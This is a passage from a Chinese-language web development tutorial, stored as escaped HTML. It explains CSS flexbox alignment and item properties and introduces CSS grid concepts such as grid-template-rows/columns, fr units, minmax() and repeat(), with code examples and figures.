属性定义了子容器在主轴上的对齐方式。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e.ele{\n    justify-content: flex-start;      // 默认，左对齐\n    justify-content: flex-end;        // 右对齐\n    justify-content: center;          // 居中\n    justify-content: space-between;   // 两端对齐，项目之间的间隔都相等。\n    justify-content: space-around;    // 每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。\n\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/22/565bd12982aba0859944ee2c4849f9bd\" alt=\"justify-content 属性\"/\u003e\u003cfigcaption\u003ejustify-content 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch4 id=\"flex-flow-\"\u003eflex-flow 属性\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eflex-flow\u003c/code\u003e 属性是 \u003ccode\u003eflex-direction\u003c/code\u003e 属性和 \u003ccode\u003eflex-wrap\u003c/code\u003e 属性的简写形式，默认值为 \u003ccode\u003erow nowrap\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.ele\u003c/span\u003e {\n  \u003cspan class=\"hljs-attribute\"\u003eflex-flow\u003c/span\u003e: \u0026lt;flex-direction\u0026gt; || \u0026lt;flex-wrap\u0026gt;;\n}\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"align-items-\"\u003ealign-items 属性\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003ealign-items\u003c/code\u003e属性定义子容器在交叉轴上如何对齐。\u003cbr\u003e具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e.ele{\n    align-items: flex-start;    // 交叉轴的起点对齐。\n    align-items: flex-end;      // 交叉轴的终点对齐。\n    align-items: center;        // 交叉轴的中点对齐。\n    align-items: baseline;      // 项目的第一行文字的基线对齐。\n    align-items: stretch;       // 默认，如果项目未设置高度或设为auto，将占满整个容器的高度。\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/7338ceeeef84002756ae9da28ce9408f\" alt=\"align-items 属性\"/\u003e\u003cfigcaption\u003ealign-items 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch4 id=\"align-content-\"\u003ealign-content 属性\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003ealign-content\u003c/code\u003e 属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003e.ele{\n    align-content: flex-start;   // 与交叉轴的起点对齐\n    align-content; flex-end;     // 与交叉轴的终点对齐。\n    align-content: center;       // 与交叉轴的中点对齐。\n    align-content: space-between;// 与交叉轴两端对齐，轴线之间的间隔平均分布。\n    align-content: space-around; // 每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。\n    align-content: stretch;     // 默认 轴线占满整个交叉轴。\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/8bd84cd223d886c10c4321f84b957a1d\" alt=\"align-content 属性\"/\u003e\u003cfigcaption\u003ealign-content 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e子容器属性\u003c/h3\u003e\n\u003cp\u003e子容器也有 6 个属性：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eorder：子容器的排列顺序\u003c/li\u003e\n\u003cli\u003eflex-grow：子容器剩余空间的拉伸比例\u003c/li\u003e\n\u003cli\u003eflex-shrink：子容器超出空间的压缩比例\u003c/li\u003e\n\u003cli\u003eflex-basis：子容器在不伸缩情况下的原始尺寸\u003c/li\u003e\n\u003cli\u003eflex：子元素的 \u003ccode\u003eflex\u003c/code\u003e 属性是 \u003ccode\u003eflex-grow\u003c/code\u003e,\u003ccode\u003eflex-shrink\u003c/code\u003e 和  \u003ccode\u003eflex-basis\u003c/code\u003e 的简写\u003c/li\u003e\n\u003cli\u003ealign-self\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"order-\"\u003eorder 属性\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eorder\u003c/code\u003e 属性定义项目的排列顺序。数值越小，排列越靠前，默认为 0。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.ele\u003c/span\u003e{\n   \u003cspan class=\"hljs-attribute\"\u003eorder\u003c/span\u003e: num; \n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/f0f195ab789f428b77048a5f9f5029a8\" alt=\"order 属性\"/\u003e\u003cfigcaption\u003eorder 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch4 id=\"flex-grow-\"\u003eflex-grow 属性\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eflex-grow\u003c/code\u003e 属性定义子容器的伸缩比例。按照该比例给子容器分配空间。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.ele\u003c/span\u003e{\n    \u003cspan class=\"hljs-attribute\"\u003eflex-grow\u003c/span\u003e: \u0026lt;number\u0026gt;; \u003cspan class=\"hljs-comment\"\u003e/* default 0 */\u003c/span\u003e\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/337974db1b847cd76284f0212e8c18e9\" alt=\"flex-grow 属性\"/\u003e\u003cfigcaption\u003eflex-grow 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch4 id=\"flex-shrink-\"\u003eflex-shrink 属性\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eflex-shrink\u003c/code\u003e 属性定义了子容器弹性收缩的比例。如图，超出的部分按 1:2 的比例从给子容器中减去。\u003cstrong\u003e此属性要生效，父容器的 \u003ccode\u003eflex-wrap\u003c/code\u003e 属性要设置为 \u003ccode\u003enowrap\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.ele\u003c/span\u003e{\n    \u003cspan class=\"hljs-attribute\"\u003eflex-shrink\u003c/span\u003e: \u0026lt;number\u0026gt;; \u003cspan class=\"hljs-comment\"\u003e/* default 0 */\u003c/span\u003e\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/38f7b20197c66a4023e8ae7c2359ce49\" alt=\"flex-shrink 属性\"/\u003e\u003cfigcaption\u003eflex-shrink 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch4 id=\"flex-basis-\"\u003eflex-basis 属性\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eflex-basis\u003c/code\u003e 属性定义了子容器在不伸缩情况下的原始尺寸，主轴为横向时代表宽度，主轴为纵向时代表高度。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.ele\u003c/span\u003e{\n    \u003cspan class=\"hljs-attribute\"\u003eflex-basis\u003c/span\u003e: \u0026lt;length\u0026gt; | auto; \u003cspan class=\"hljs-comment\"\u003e/* default auto */\u003c/span\u003e\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/8ce63d57d844623ec8ac69fdaea145a2\" alt=\"flex-basis 属性\"/\u003e\u003cfigcaption\u003eflex-basis 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch4 id=\"flex-\"\u003eflex 属性\u003c/h4\u003e\n\u003cp\u003e子元素的 \u003ccode\u003eflex\u003c/code\u003e 属性是 \u003ccode\u003eflex-grow\u003c/code\u003e,\u003ccode\u003eflex-shrink\u003c/code\u003e 和  \u003ccode\u003eflex-basis\u003c/code\u003e 的简写，默认值为 \u003ccode\u003e0\u003c/code\u003e \u003ccode\u003e1\u003c/code\u003e \u003ccode\u003eauto\u003c/code\u003e。后两个属性可选。\u003c/p\u003e\n\u003cp\u003e该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。\u003c/p\u003e\n\u003ch4 id=\"align-self-\"\u003ealign-self 属性\u003c/h4\u003e\n\u003cp\u003e子容器的 \u003ccode\u003ealign-self\u003c/code\u003e 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖父容器 \u003ccode\u003ealign-items\u003c/code\u003e 属性。默认值为 \u003ccode\u003eauto\u003c/code\u003e，表示继承父元素的 \u003ccode\u003ealign-items\u003c/code\u003e属性，如果没有父元素，则等同于 \u003ccode\u003estretch\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e.ele{\n    align-self: auto;             // 继承父元素的 align-items 属性\n    align-self: flex-start;       // 交叉轴的起点对齐。\n    align-self: flex-end;         // 交叉轴的终点对齐。\n    align-self: center;           // 交叉轴的中点对齐。\n    align-self: baseline;         // 项目的第一行文字的基线对齐。\n    align-self: stretch;          // 默认，如果项目未设置高度或设为auto，将占满整个容器的高度。\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/b32a73e3d6fee2259eb2215fbde7649d\" alt=\" align-self 属性\"/\u003e\u003cfigcaption\u003e align-self 属性\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch1 id=\"grid-\"\u003egrid 网格布局\u003c/h1\u003e\n\u003cp\u003eflex 布局虽然强大，但是只能是一维布局，如果要进行二维布局，那么我们还需要使用 grid。\u003c/p\u003e\n\u003cp\u003egrid 布局又称为“网格布局”，可以实现二维布局方式，和之前的 表格\u003ccode\u003etable\u003c/code\u003e布局差不多，然而，这是使用 CSS 控制的，不是使用 HTML 控制的，同时还可以依赖于媒体查询根据不同的上下文得新定义布局。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e网格布局还可以让我们摆脱现在布局中存在的文档流限制，换句话说，你的结构不需要根据设计稿从上往上布置了。这也意味着您可以自由地更改页面元素位置。这最适合你在不同的断点位置实现你最需要的布局，而不再需要为响应你的设计而担心HTML结构的问题。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e和 \u003ccode\u003etable\u003c/code\u003e 布局不同的是，\u003ccode\u003egrid\u003c/code\u003e 布局不需要在 HTML 中使用特定的标签布局，所有的布局都是在 CSS 中完成的，你可以随意定义你的 grid 网格。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e没有 HTML 结构的网格布局有助于使用流体、调整顺序等技术管理或更改布局。通过结合 CSS 的媒体查询属性，可以控制网格布局容器和他们的子元素，使用页面的布局根据不同的设备和可用空间调整元素的显示风格与定位，而不需要去改变文档结构的本质内容。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"-\"\u003e浏览器兼容性如下：\u003c/h2\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/f097d6eeb2d30ba3e2639239ae414bd5\" alt=\"浏览器兼容\"/\u003e\u003cfigcaption\u003e浏览器兼容\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"grid-\"\u003egrid 网格布局中的基本概念\u003c/h2\u003e\n\u003cp\u003e此部分直接摘自\u003ca href=\"http://www.w3cplus.com/css3/what-is-css-grid-layout.html\" target=\"_blank\"\u003eCSS Grid布局：什么是网格布局\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"-grid-lines-\"\u003e网格线(Grid Lines)\u003c/h3\u003e\n\u003cp\u003e网格线组成了网格，他是网格的水平和垂直的分界线。一个网格线存在行或列的两侧。我们可以引用它的数目或者定义的网格线名称。\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/9bc9d5224b3d0d2970b2f62dc990456c\" alt=\"网格线(Grid Lines)\"/\u003e\u003cfigcaption\u003e网格线(Grid Lines)\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch3 id=\"-grid-track-\"\u003e网格轨道(Grid Track)\u003c/h3\u003e\n\u003cp\u003e网格轨道是就是相邻两条网格线之间的空间，就好比表格中行或列。所在在网格中其分为grid column和grid row。每个网格轨道可以设置一个大小，用来控制宽度或高度。\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/a2d49458713678dea41afe1b4a190a87\" alt=\"网格轨道(Grid Track)\"/\u003e\u003cfigcaption\u003e网格轨道(Grid Track)\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch3 id=\"-grid-cell-\"\u003e网格单元格(Grid Cell)\u003c/h3\u003e\n\u003cp\u003e网格单元格是指四条网格线之间的空间。所以它是最小的单位，就像表格中的单元格。\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/e41c9e0e7d472e0906a9a7c339476d29\" alt=\"网格单元格(Grid Cell)\"/\u003e\u003cfigcaption\u003e网格单元格(Grid Cell)\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch3 id=\"-grid-area-\"\u003e网格区域(Grid Area)\u003c/h3\u003e\n\u003cp\u003e网格区域是由任意四条网格线组成的空间，所以他可能包含一个或多个单元格。相当于表格中的合并单元格之后的区域。\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/d2e76b9a3878f766d976d060152087a5\" alt=\"网格区域(Grid Area)\"/\u003e\u003cfigcaption\u003e网格区域(Grid Area)\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-grid-\"\u003e使用 grid 布局\u003c/h2\u003e\n\u003cp\u003e使用 grid 布局很简单，通过display属性设置属性值为 grid 或 inline-grid 或者是 subgrid（该元素父元素为网格，继承父元素的行和列的大小） 就可以了。\u003c/p\u003e\n\u003cp\u003e网格容器中的所有子元素就会自动变成网格项目（grid item），然后设置列（grid-template-columns）和 行（grid-template-rows）的大小，设置 \u003ccode\u003egrid-template-columns\u003c/code\u003e 有多少个参数生成的 grid 列表就有多少个列。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注：当元素设置了网格布局，column、float、clear、vertical-align属性无效。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e如果没有设置 \u003ccode\u003egrid-template-columns\u003c/code\u003e，那么默认只有一列，宽度为父元素的 100%，例如\u003c/p\u003e\n\u003cp\u003e比如我们设置如下的 HTML，\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"grid-container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item1\"\u003c/span\u003e\u0026gt;\u003c/span\u003e1\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item2\"\u003c/span\u003e\u0026gt;\u003c/span\u003e2\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item3\"\u003c/span\u003e\u0026gt;\u003c/span\u003e3\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item4\"\u003c/span\u003e\u0026gt;\u003c/span\u003e4\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item5\"\u003c/span\u003e\u0026gt;\u003c/span\u003e5\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item6\"\u003c/span\u003e\u0026gt;\u003c/span\u003e6\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在 CSS 中，我们不设置 \u003ccode\u003egrid-template-columns\u003c/code\u003e，只设置 \u003ccode\u003egrid-template-row\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e80px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.item\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003eborder\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2px\u003c/span\u003e solid palegoldenrod;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e显示如下\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/0b6f92930f17f283e7c97eba2497d55a\" alt=\"不设置 grid-template-columns\"/\u003e\u003cfigcaption\u003e不设置 grid-template-columns\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e设置了 \u003ccode\u003egrid-template-columns\u003c/code\u003e 的话，设置了几个参数，就有几列（不超过 grid item 的个数），然后设置的 \u003ccode\u003egrid-template-row\u003c/code\u003e 参数就是每一列的高度（超出列数的高度无效）\u003c/p\u003e\n\u003cp\u003e比如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e60px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e80px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-columns\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e40px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e80px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.item\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003eborder\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2px\u003c/span\u003e solid palegoldenrod;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e虽然我们设置了四个 \u003ccode\u003egrid-template-rows\u003c/code\u003e，但是因为只有两行，所以只有前两个值生效。效果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/21f7b2a8ffec994e6e4e56983f5c60bf\" alt=\"设置 grid-template-columns\"/\u003e\u003cfigcaption\u003e设置 grid-template-columns\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e当然，我们也可以像 flex 一样设置每一列的宽度：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e60px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-columns\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003efr \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003efr \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003efr;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e注意到我们使用了一个新的单位：\u003ccode\u003efr\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003ecss fr 单位是一个自适应单位，fr单位被用于在一系列长度值中分配剩余空间，如果多个已指定了多个部分，则剩下的空间根据各自的数字按比例分配。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003etips：fr 是基于网格容器可用空间来计算的（flex 也是一样），所以我们可以和其他单位混合使用，如果需要的话\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e是不是找到了 flex 的感觉，这样设置效果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/be393b8ce9267ae2e0001cb4d457681c\" alt=\"使用 fr 按比例设置宽度\"/\u003e\u003cfigcaption\u003e使用 fr 按比例设置宽度\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e行或列最小和最大尺寸\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eminmax()\u003c/code\u003e 函数来创建行或列的最小或最大尺寸，第一个参数定义网格轨道的最小值，第二个参数定义网格轨道的最大值。可以接受任何长度值，也接受 \u003ccode\u003eauto\u003c/code\u003e 值。\u003ccode\u003eauto\u003c/code\u003e 值允许网格轨道基于内容的尺寸拉伸或挤压。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eminmax\u003c/span\u003e(100px,200px) \u003cspan class=\"hljs-built_in\"\u003eminmax\u003c/span\u003e(50px,200px);\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-columns\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003efr \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003efr \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003efr;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e300px\u003c/span\u003e;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们将第一行的高度设置为 \u003ccode\u003eminmax(100px,200px)\u003c/code\u003e，第二行的高度设置为\u003ccode\u003eminmax(50px,200px)\u003c/code\u003e，容器总高度设置为 \u003ccode\u003e300px\u003c/code\u003e，这时每一列的高度要怎么算呢？\u003c/p\u003e\n\u003cp\u003e先判断总高度是小于第一列高度的最大值和第二列高度的最大值之和的，如果大于最大值之和，那么第一列和第二列的高度都为设置的最大值，如果是小于最小值之和的话，那么第一列和第二列的高度都为设置的最小值。\u003c/p\u003e\n\u003cp\u003e现在问题来了，我们这种情况是总高度是小于第一列高度的最大值和第二列高度的最大值之和的，这样就是先用 总高度 \u003ccode\u003e300px\u003c/code\u003e - 第一列最小高度 \u003ccode\u003e100px\u003c/code\u003e - 第二列最小高度 \u003ccode\u003e50px\u003c/code\u003e = \u003ccode\u003e150px\u003c/code\u003e。\u003cbr\u003e第一列高度：第一列最小高度 \u003ccode\u003e100px\u003c/code\u003e + \u003ccode\u003e150px/2\u003c/code\u003e = \u003ccode\u003e175px\u003c/code\u003e;\u003cbr\u003e第二列高度：第一列最小高度 \u003ccode\u003e50px\u003c/code\u003e + \u003ccode\u003e150px/2\u003c/code\u003e = \u003ccode\u003e125px\u003c/code\u003e;\u003c/p\u003e\n\u003cp\u003e效果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/77446497022ddff4294ba277dbeee225\" alt=\"最小和最大尺寸设置\"/\u003e\u003cfigcaption\u003e最小和最大尺寸设置\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e重复行或者列\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003erepeat()\u003c/code\u003e 属性可以创建重复的网格轨道。这个适用于创建相等尺寸的网格项目和多个网格项目。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003erepeat()\u003c/code\u003e 也接受两个参数：第一个参数定义网格轨道应该重复的次数，第二个参数定义每个轨道的尺寸。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-columns\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003erepeat\u003c/span\u003e(2,100px);\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003erepeat\u003c/span\u003e(3,100px);\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/a437f5a1f6759f37b1abd2b5b58cd18c\" 